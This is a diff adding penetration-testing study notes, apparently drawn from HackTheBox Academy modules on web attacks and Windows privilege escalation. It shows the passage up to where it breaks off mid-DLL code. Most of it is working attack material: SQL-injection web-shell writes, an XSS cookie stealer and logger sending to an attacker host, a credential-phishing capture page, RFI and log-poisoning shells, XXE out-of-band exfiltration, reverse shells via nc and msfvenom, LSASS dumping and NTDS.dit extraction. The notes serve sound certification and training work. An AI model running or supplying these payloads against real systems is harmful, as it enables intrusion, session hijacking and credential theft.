@@ -271,7 +271,88 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Obfuscation Tools](#obfuscation-tools)
   - [Blind / Out-of-Band Checks](#blind--out-of-band-checks)
   - [Prevention](#prevention)
-- [20. Useful Resources](#20-useful-resources)
+- [20. Attacking Web Applications with Ffuf](#20-attacking-web-applications-with-ffuf)
+  - [Directory and Page Fuzzing](#directory-and-page-fuzzing)
+  - [Domain and Vhost Fuzzing](#domain-and-vhost-fuzzing)
+  - [Parameter and Value Fuzzing](#parameter-and-value-fuzzing)
+  - [Result Filters](#result-filters)
+- [21. SQL Injection Fundamentals](#21-sql-injection-fundamentals)
+  - [MySQL Basics](#mysql-basics)
+  - [Authentication Bypass](#authentication-bypass)
+  - [UNION Injection](#union-injection)
+  - [Database Enumeration](#database-enumeration)
+  - [Reading and Writing Files](#reading-and-writing-files)
+  - [Mitigations](#mitigations)
+- [22. Cross-Site Scripting (XSS)](#22-cross-site-scripting-xss)
+  - [Types](#types)
+  - [Test Payloads](#test-payloads)
+  - [Discovery](#discovery)
+  - [Defacing](#defacing)
+  - [Phishing](#phishing)
+  - [Session Hijacking](#session-hijacking)
+  - [Prevention](#prevention-1)
+- [23. File Inclusion](#23-file-inclusion)
+  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
+  - [PHP Filters](#php-filters)
+  - [PHP Wrappers](#php-wrappers)
+  - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+  - [LFI + File Upload](#lfi--file-upload)
+  - [Log Poisoning](#log-poisoning)
+  - [Automation](#automation)
+  - [Prevention](#prevention-2)
+- [24. File Upload Attacks](#24-file-upload-attacks)
+  - [Web Shell Upload](#web-shell-upload)
+  - [Client-Side Validation](#client-side-validation)
+  - [Filter Bypasses](#filter-bypasses)
+  - [Limited Uploads](#limited-uploads)
+  - [Other Upload Attacks](#other-upload-attacks)
+  - [Prevention](#prevention-3)
+- [25. Web Attacks](#25-web-attacks)
+  - [HTTP Verb Tampering](#http-verb-tampering)
+  - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
+  - [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
+  - [Prevention](#prevention-4)
+- [26. Windows Privilege Escalation](#26-windows-privilege-escalation)
+  - [Tools](#tools)
+  - [Situational Awareness and Enumeration](#situational-awareness-and-enumeration)
+  - [User Privileges](#user-privileges)
+    - [SeImpersonate / SeAssignPrimaryToken](#seimpersonate--seassignprimarytoken)
+    - [SeDebugPrivilege](#sedebugprivilege)
+    - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
+  - [Group Privileges](#group-privileges)
+    - [Backup Operators / SeBackupPrivilege](#backup-operators--sebackupprivilege)
+    - [Event Log Readers](#event-log-readers)
+    - [DnsAdmins](#dnsadmins)
+    - [Hyper-V Administrators](#hyper-v-administrators)
+    - [Print Operators](#print-operators)
+    - [Server Operators](#server-operators)
+  - [User Account Control (UAC)](#user-account-control-uac)
+  - [Weak Permissions and Services](#weak-permissions-and-services)
+  - [Kernel Exploits](#kernel-exploits-1)
+  - [Vulnerable Services](#vulnerable-services-1)
+  - [DLL Injection and Hijacking](#dll-injection-and-hijacking)
+  - [Credential Theft](#credential-theft)
+  - [Restricted Environments and Additional Techniques](#restricted-environments-and-additional-techniques)
+    - [Citrix Breakout](#citrix-breakout)
+    - [Scheduled Tasks](#scheduled-tasks)
+    - [End-of-Life Systems](#end-of-life-systems)
+  - [Hardening](#hardening)
+- [27. Documentation & Reporting](#27-documentation--reporting)
+  - [Notetaking and Organization](#notetaking-and-organization)
+  - [Report Types](#report-types)
+  - [Components of a Finding](#components-of-a-finding)
+  - [Writing Tips](#writing-tips)
+  - [Report Quality Checklist](#report-quality-checklist)
+- [28. Attacking Enterprise Networks](#28-attacking-enterprise-networks)
+  - [Engagement Flow](#engagement-flow)
+  - [External Information Gathering](#external-information-gathering)
+  - [Service and Web Enumeration](#service-and-web-enumeration)
+  - [Initial Access](#initial-access)
+  - [Internal Information Gathering](#internal-information-gathering)
+  - [Lateral Movement and AD Compromise](#lateral-movement-and-ad-compromise)
+  - [Post-Exploitation and Closeout](#post-exploitation-and-closeout)
+  - [Engagement Checklist](#engagement-checklist)
+- [29. Useful Resources](#29-useful-resources)
 
 </details>
 
@@ -4344,7 +4425,1186 @@ Invoke-DOSfuscation
 - Run services with least privilege and disable unnecessary shell functions.
 - Use a WAF as defense in depth, not as the only control.
 
-## 20. Useful Resources
+## 20. Attacking Web Applications with Ffuf
+
+> Condensed from HTB Academy **Attacking Web Applications with Ffuf** (module 54).
+
+### Directory and Page Fuzzing
+
+```bash
+# Basic directory fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+  -u http://<TARGET>/FUZZ
+
+# Discover extensions for a known page
+ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
+  -u http://<TARGET>/blog/indexFUZZ
+
+# Discover pages with a known extension
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+  -u http://<TARGET>/blog/FUZZ.php
+
+# Recursive fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+  -u http://<TARGET>/FUZZ -recursion -recursion-depth 1 -e .php -v
+```
+
+### Domain and Vhost Fuzzing
+
+```bash
+# Subdomain fuzzing
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u https://FUZZ.<DOMAIN>/
+
+# Virtual-host fuzzing
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>'
+
+# Filter out the default response size
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>
+```
+
+Add discovered hosts to `/etc/hosts`:
+
+```bash
+sudo sh -c 'echo "<TARGET_IP>  <VHOST>.<DOMAIN>" >> /etc/hosts'
+```
+
+### Parameter and Value Fuzzing
+
+```bash
+# GET parameter names
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u "http://<TARGET>/admin.php?FUZZ=key" -fs <SIZE>
+
+# POST parameter names
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u http://<TARGET>/admin.php -X POST -d 'FUZZ=key' \
+  -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>
+
+# Value fuzzing
+for i in $(seq 1 1000); do echo $i >> ids.txt; done
+ffuf -w ids.txt:FUZZ -u http://<TARGET>/admin.php -X POST -d 'id=FUZZ' \
+  -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>
+```
+
+### Result Filters
+
+| Flag | Effect |
+|---|---|
+| `-fs <size>` | Filter by response size |
+| `-fc <code>` | Filter by status code |
+| `-fw <words>` | Filter by word count |
+| `-fl <lines>` | Filter by line count |
+| `-fr <regex>` | Filter by response regex |
+| `-mc <code>` | Match status code |
+| `-mr <regex>` | Match response regex |
+
+Use `ffuf -h` for the full option list. Save output with `-o results.json -of json`.
+
+## 21. SQL Injection Fundamentals
+
+> Condensed from HTB Academy **SQL Injection Fundamentals** (module 33).
+
+### MySQL Basics
+
+```bash
+mysql -u <USER> -p -h <HOST> -P 3306
+```
+
+```sql
+SELECT * FROM <TABLE>;
+SELECT <COLUMN1>, <COLUMN2> FROM <TABLE>;
+SELECT * FROM <TABLE> WHERE <CONDITION>;
+SELECT * FROM <TABLE> ORDER BY <COLUMN> [ASC|DESC];
+SELECT * FROM <TABLE> LIMIT <N>;
+SELECT * FROM <TABLE> LIMIT <OFFSET>, <N>;
+SELECT * FROM <TABLE> WHERE <COLUMN> LIKE '<PATTERN>';
+```
+
+Common operators: `AND`, `OR`, `NOT`, `=`, `!=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`.
+
+### Authentication Bypass
+
+```sql
+-- Vulnerable query: SELECT * FROM users WHERE username='<INPUT>' AND password='<INPUT>';
+' OR '1'='1'-- -
+' OR 1=1-- -
+admin'-- -
+' OR '1'='1' #
+```
+
+The comment sequence terminates the rest of the original query; the exact comment style depends on the DBMS (`-- -`, `#`, `/* */`).
+
+### UNION Injection
+
+```sql
+-- Find the number of columns
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+
+-- Confirm the display columns
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+
+-- Extract data into the visible columns
+' UNION SELECT 1,username,password,4 FROM users-- -
+```
+
+### Database Enumeration
+
+```sql
+SELECT database();
+SELECT @@version;
+SELECT user();
+SELECT current_user();
+
+SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA;
+SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DB>';
+SELECT column_name, table_name, table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>';
+```
+
+```sql
+-- Via UNION
+' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+' UNION SELECT 1,database(),3,4-- -
+' UNION SELECT 1,table_name,table_schema,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DB>'-- -
+' UNION SELECT 1,column_name,table_name,table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>'-- -
+```
+
+### Reading and Writing Files
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/var/www/html/index.php');
+
+-- Check the file-import/export restriction
+SELECT variable_name, variable_value FROM information_schema.global_variables
+WHERE variable_name='secure_file_priv';
+
+-- Write a file (requires FILE privilege and a writable destination)
+SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+```sql
+-- Web shell via UNION
+' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+```
+
+### Mitigations
+
+- Use prepared statements/parameterized queries.
+- Apply least privilege to the database account; avoid `FILE` and `SUPER` where possible.
+- Validate and allowlist input; escape output.
+- Disable detailed SQL errors in production.
+- Use a WAF as defense in depth.
+
+## 22. Cross-Site Scripting (XSS)
+
+> Condensed from HTB Academy **Cross-Site Scripting (XSS)** (module 103).
+
+### Types
+
+- **Stored XSS** — payload is persisted (comments, profiles, support tickets).
+- **Reflected XSS** — payload is reflected from the request (search, error pages).
+- **DOM XSS** — client-side JavaScript writes untrusted data into the DOM.
+
+### Test Payloads
+
+```html
+<script>alert(window.origin)</script>
+<img src=x onerror=alert(window.origin)>
+<svg onload=alert(window.origin)>
+"><script>alert(window.origin)</script>
+'><script>alert(window.origin)</script>
+```
+
+Use `window.origin` instead of `alert(1)` to confirm which origin executed the payload. Inspect the DOM to see whether the payload is stored, reflected, or written by JavaScript.
+
+### Discovery
+
+```bash
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py -u "http://<TARGET>/index.php?task=test"
+```
+
+Also test each input/context manually: HTML body, attributes, JavaScript strings, URLs, and DOM sinks.
+
+### Defacing
+
+```html
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://<ATTACKER>/image.png"</script>
+<script>document.title = 'Defaced'</script>
+<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Defaced</h1>'</script>
+```
+
+### Phishing
+
+Host a fake login page and capture submitted credentials in a controlled lab:
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://<TARGET>/");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+```bash
+sudo php -S 0.0.0.0:80
+```
+
+### Session Hijacking
+
+Inject a script that sends the victim's cookies to your listener:
+
+```html
+<script src="http://<ATTACKER>/script.js"></script>
+<script>new Image().src="http://<ATTACKER>/?c="+document.cookie;</script>
+```
+
+Cookie logger (`script.js` / `index.php`):
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+```bash
+sudo php -S 0.0.0.0:80
+cat cookies.txt
+```
+
+Use captured cookies only in the authorized lab; `HttpOnly` cookies are not accessible to JavaScript.
+
+### Prevention
+
+- Context-aware output encoding (HTML, attribute, JavaScript, URL).
+- Input validation and allowlists; sanitize rich HTML with DOMPurify.
+- Content Security Policy (CSP) to restrict script sources.
+- `HttpOnly` and `Secure` cookies; `SameSite` attributes.
+- Avoid dangerous sinks (`innerHTML`, `document.write`, `eval`).
+
+## 23. File Inclusion
+
+> Condensed from HTB Academy **File Inclusion** (module 23).
+
+### Local File Inclusion (LFI)
+
+```text
+?language=../../../../etc/passwd
+?language=....//....//....//etc/passwd
+?language=..%2f..%2f..%2f..%2fetc%2fpasswd
+?language=/etc/passwd
+?language=....\/....\/....\/etc/passwd
+```
+
+Bypass filters that strip `../` by repeating or encoding the sequence. Check the application's language/framework behavior (PHP, NodeJS, Java, .NET).
+
+### PHP Filters
+
+```text
+?language=php://filter/read=convert.base64-encode/resource=index.php
+?language=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+```
+
+```bash
+curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=config' | base64 -d
+```
+
+### PHP Wrappers
+
+```text
+# data:// — execute inline PHP (allow_url_include required)
+?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+
+# php://input — execute POST body
+?language=php://input&cmd=id
+POST body: <?php system($_GET["cmd"]); ?>
+
+# expect:// — command execution (if the expect extension is loaded)
+?language=expect://id
+```
+
+### Remote File Inclusion (RFI)
+
+```bash
+# Host the shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sudo python3 -m http.server <PORT>
+
+# Include it
+?language=http://<ATTACKER>/shell.php&cmd=id
+?language=ftp://<USER>:<PASSWORD>@<ATTACKER>/shell.php&cmd=id
+?language=\\<ATTACKER>\share\shell.php&cmd=id
+```
+
+RFI requires `allow_url_include=On` (or the relevant wrapper to be enabled). SMB inclusion can work from Windows targets.
+
+### LFI + File Upload
+
+```bash
+# GIF/PHP polyglot
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+# ZIP archive with a PHP file inside
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+zip shell.jpg shell.php
+
+# PHAR archive
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Then include the uploaded file with the appropriate wrapper (`zip://`, `phar://`, etc.).
+
+### Log Poisoning
+
+```bash
+# Poison a User-Agent field
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<TARGET>/index.php" -H @Poison
+
+# Common logs to include
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/var/log/vsftpd.log
+/proc/self/environ
+```
+
+### Automation
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+  -u 'http://<TARGET>/index.php?language=FUZZ' -fs <SIZE>
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
+  -u 'http://<TARGET>/index.php?language=../../../../FUZZ/index.php' -fs <SIZE>
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://<TARGET>/index.php?FUZZ=value' -fs <SIZE>
+```
+
+### Prevention
+
+- Avoid passing user-controlled paths to include/require functions.
+- Use a fixed allowlist of files or map IDs to files.
+- Sanitize traversal sequences and use canonical paths.
+- Disable `allow_url_include` and unnecessary wrappers.
+- Run the web service with least privilege.
+
+## 24. File Upload Attacks
+
+> Condensed from HTB Academy **File Upload Attacks** (module 136).
+
+### Web Shell Upload
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+```asp
+<% eval request('cmd') %>
+```
+
+```bash
+# Reverse shell payload
+msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.php
+nc -lvnp <PORT>
+```
+
+```bash
+curl 'http://<TARGET>/uploads/shell.php?cmd=id'
+```
+
+### Client-Side Validation
+
+- Disable JavaScript or intercept the upload request in Burp/ZAP.
+- Change the `Content-Type` and filename after the browser validates them.
+- Send the file directly with `curl -F`.
+
+```bash
+curl -F 'file=@shell.php;type=image/jpeg' http://<TARGET>/upload.php
+```
+
+### Filter Bypasses
+
+- **Blacklist** — try alternate extensions (`.php3`, `.phtml`, `.phar`), case variations, double extensions, trailing dots/spaces, or null bytes on old PHP.
+- **Whitelist** — use a double extension or a parser-confusion extension that still executes (verify on the target).
+- **Content-Type** — change the multipart `Content-Type` to an allowed image type.
+- **Magic bytes** — prepend an image signature (`GIF8`, JPEG header) to a PHP file.
+- **Filename** — test path traversal or injection in the filename.
+
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+echo "this is a text file" > text.jpg
+file text.jpg
+```
+
+```text
+# Content-type examples
+image/jpeg
+image/png
+application/x-php
+```
+
+### Limited Uploads
+
+- **SVG** — can contain JavaScript or XXE.
+- **Image metadata** — `exiftool` comments can carry XSS payloads.
+- **XXE via SVG** — read local files through an external entity.
+
+```bash
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+### Other Upload Attacks
+
+- Archive uploads (ZIP/TAR) with path traversal.
+- `.htaccess` upload to enable PHP execution.
+- Filename injection into logs or commands.
+- Upload to a publicly accessible directory and execute.
+
+### Prevention
+
+- Allowlist file types and validate content, not just the extension or `Content-Type`.
+- Rename uploaded files and store them outside the web root.
+- Disable execution in upload directories.
+- Set size limits and scan uploads.
+- Use a separate domain/CDN for user content.
+
+## 25. Web Attacks
+
+> Condensed from HTB Academy **Web Attacks** (module 134).
+
+### HTTP Verb Tampering
+
+```bash
+# Discover allowed methods
+curl -i -X OPTIONS http://<TARGET>/
+curl -i -X TRACE http://<TARGET>/
+
+# Try alternate verbs against an endpoint
+curl -i -X HEAD http://<TARGET>/admin
+curl -i -X PUT http://<TARGET>/admin
+curl -i -X DELETE http://<TARGET>/admin
+```
+
+Check whether authentication or authorization is enforced for every method. Some applications only protect `GET`/`POST`.
+
+### Insecure Direct Object References (IDOR)
+
+```bash
+# Enumerate object IDs
+curl -s "http://<TARGET>/documents.php?uid=1"
+curl -s "http://<TARGET>/documents.php?uid=2"
+
+# Extract document links
+curl -s "http://<TARGET>/documents.php?uid=3" | grep -oP '\/documents.*?\.pdf'
+
+# Encoded references — try hashes
+echo -n 1 | md5sum
+echo -n 1 | base64 -w 0 | md5sum
+for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+```
+
+```bash
+# Brute-force a predictable reference
+for i in {1..100}; do
+  hash=$(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -')
+  curl -sOJ -X POST -d "contract=$hash" http://<TARGET>/download.php
+done
+```
+
+Test API endpoints and JSON bodies too; IDOR often appears in `GET /api/user/<id>`, `PUT /api/document/<id>`, and nested object IDs.
+
+### XML External Entity (XXE) Injection
+
+Local file disclosure:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<root>
+  <name></name>
+  <tel></tel>
+  <email>&company;</email>
+  <message></message>
+</root>
+```
+
+External DTD for advanced disclosure:
+
+```text
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+Blind OOB exfiltration:
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER>:8000/?content=%file;'>">
+```
+
+```bash
+# Capture the callback
+php -S 0.0.0.0:8000
+cat Logs/<TARGET>/etc/passwd.log
+```
+
+Automation:
+
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 \
+  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+```
+
+### Prevention
+
+- Disable external entity and DTD processing in XML parsers.
+- Enforce object-level authorization on every request, not just the UI.
+- Use unguessable IDs and validate ownership server-side.
+- Allowlist HTTP methods and enforce auth for every method.
+- Use a WAF as defense in depth.
+## 26. Windows Privilege Escalation
+
+> Condensed from HTB Academy **Windows Privilege Escalation** (module 67). Lab passwords, hashes, and tokens are omitted; replace placeholders before use.
+
+### Tools
+
+- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) — `Invoke-AllChecks`
+- [SharpUp](https://github.com/GhostPack/SharpUp) — `SharpUp.exe audit`
+- [Seatbelt](https://github.com/GhostPack/Seatbelt) — host enumeration
+- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+- [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk), [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
+- [Sherlock](https://github.com/rasta-mouse/Sherlock), [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+### Situational Awareness and Enumeration
+
+```cmd
+whoami
+whoami /priv
+whoami /groups
+whoami /user
+
+hostname
+systeminfo
+wmic qfe
+wmic product get name
+tasklist /svc
+netstat -ano
+query user
+set
+net user
+net localgroup
+net localgroup administrators
+net accounts
+```
+
+```powershell
+Get-HotFix | ft -AutoSize
+Get-WmiObject -Class Win32_Product | select Name, Version
+Get-MpComputerStatus
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
+Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User | fl
+```
+
+Pipes and named-pipe permissions:
+
+```cmd
+pipelist.exe /accepteula
+gci \\.\pipe\
+accesschk.exe /accepteula \\.\Pipe\lsass -v
+```
+
+### User Privileges
+
+Check `whoami /priv` for enabled privileges. Common escalation paths:
+
+#### SeImpersonate / SeAssignPrimaryToken
+
+Commonly available to service accounts (IIS, MSSQL). Use a token-impersonation tool:
+
+```cmd
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
+  -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *
+
+PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -i
+
+RoguePotato.exe -r <ATTACKER_IP> -e "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -l 9999
+```
+
+Start a listener first:
+
+```bash
+nc -lvnp 8443
+```
+
+#### SeDebugPrivilege
+
+Dump LSASS and extract credentials offline:
+
+```cmd
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+```text
+mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
+
+#### SeTakeOwnershipPrivilege
+
+Take ownership of a protected file, grant yourself access, and read it:
+
+```powershell
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+whoami /priv
+```
+
+```cmd
+takeown /f "C:\<PATH>\<FILE>"
+icacls "C:\<PATH>\<FILE>" /grant <USER>:F
+type "C:\<PATH>\<FILE>"
+```
+
+### Group Privileges
+
+#### Backup Operators / SeBackupPrivilege
+
+```powershell
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+
+Copy-FileSeBackupPrivilege 'C:\Confidential\<FILE>' .\<FILE>
+```
+
+Copy `NTDS.dit` and registry hives:
+
+```cmd
+diskshadow.exe
+dir E:
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+
+```bash
+secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
+```
+
+#### Event Log Readers
+
+```cmd
+net localgroup "Event Log Readers"
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+```
+
+```powershell
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} |
+  Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
+#### DnsAdmins
+
+Load a malicious DLL into the DNS service:
+
+```cmd
+msfvenom -p windows/x64/exec cmd='net group "Domain Admins" <USER> /add /domain' -f dll -o adduser.dll
+python3 -m http.server 7777
+```
+
+```powershell
+wget "http://<ATTACKER_IP>:7777/adduser.dll" -OutFile "adduser.dll"
+```
+
+```cmd
+dnscmd.exe /config /serverlevelplugindll C:\Users\<USER>\Desktop\adduser.dll
+sc stop dns
+sc start dns
+net group "Domain Admins" /dom
+```
+
+Clean up:
+
+```cmd
+reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+sc.exe start dns
+```
+
+#### Hyper-V Administrators
+
+Replace a privileged service binary:
+
+```cmd
+takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+sc.exe start MozillaMaintenance
+```
+
+#### Print Operators
+
+Use the Capcom `SeLoadDriverPrivilege` driver exploit:
+
+```cmd
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+
+.\EnableSeLoadDriverPrivilege.exe
+.\ExploitCapcom.exe
+```
+
+Clean up:
+
+```cmd
+reg delete HKCU\System\CurrentControlSet\Capcom
+```
+
+#### Server Operators
+
+Reconfigure a service binary path:
+
+```cmd
+sc qc AppReadiness
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"
+sc start AppReadiness
+net localgroup Administrators
+```
+
+### User Account Control (UAC)
+
+```cmd
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+```
+
+If `EnableLUA=1`, test UAC bypasses such as:
+
+- `fodhelper.exe` / `computerdefaults.exe` registry hijack.
+- DLL hijacking in `%LOCALAPPDATA%\Microsoft\WindowsApps`.
+- `SystemPropertiesAdvanced.exe` DLL search-order hijack.
+
+Example DLL-hijack path:
+
+```cmd
+copy payload.dll "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
+rundll32 shell32.dll,Control_RunDLL "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
+```
+
+### Weak Permissions and Services
+
+```cmd
+SharpUp.exe audit
+accesschk.exe /accepteula -quvcw <SERVICE>
+icacls "C:\Program Files\<VENDOR>\<SERVICE>.exe"
+
+# Modifiable service binary
+sc config <SERVICE> binPath= "cmd /c net localgroup Administrators <USER> /add"
+sc stop <SERVICE>
+sc start <SERVICE>
+```
+
+Find unquoted service paths:
+
+```cmd
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" |
+  findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+Check registry permissions:
+
+```cmd
+accesschk.exe /acceptula -kvuqsw hklm\System\CurrentControlSet\services
+```
+
+### Kernel Exploits
+
+```cmd
+systeminfo
+wmic qfe list brief
+Get-HotFix
+```
+
+Examples:
+
+```cmd
+# SeriousSAM / HiveNightmare
+icacls C:\Windows\System32\config\SAM
+.\HiveNightmare.exe
+impacket-secretsdump -sam SAM-<DATE> -system SYSTEM-<DATE> -security SECURITY-<DATE> local
+```
+
+```powershell
+# PrintNightmare (CVE-2021-1675) — lab only
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\CVE-2021-1675.ps1
+Invoke-Nightmare -NewUser "<USER>" -NewPassword "<PASSWORD>" -DriverName "PrintIt"
+```
+
+```cmd
+# CVE-2020-0668 — replace a privileged service binary
+C:\Tools\CVE-2020-0668\CVE-2020-0668.exe <PAYLOAD>.exe ^
+  "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
+net start MozillaMaintenance
+```
+
+Use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) or Sherlock to match the patch level to a public exploit. Kernel exploits can crash the target.
+
+### Vulnerable Services
+
+```cmd
+wmic product get name
+netstat -ano | findstr <PORT>
+get-process -Id <PID>
+get-service | ? {$_.DisplayName -like '<VENDOR>*'}
+```
+
+Look for services running as `SYSTEM` with an RPC/HTTP interface, default credentials, or known CVEs. Test in the lab and document the impact.
+
+### DLL Injection and Hijacking
+
+- Identify a service that loads a DLL from a writable directory or has an unquoted path.
+- Build a DLL with `DllMain` that executes your payload.
+- Place it where the service will load it, then restart the service.
+
+```c
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    switch (reason) {
+    case DLL_PROCESS_ATTACH:
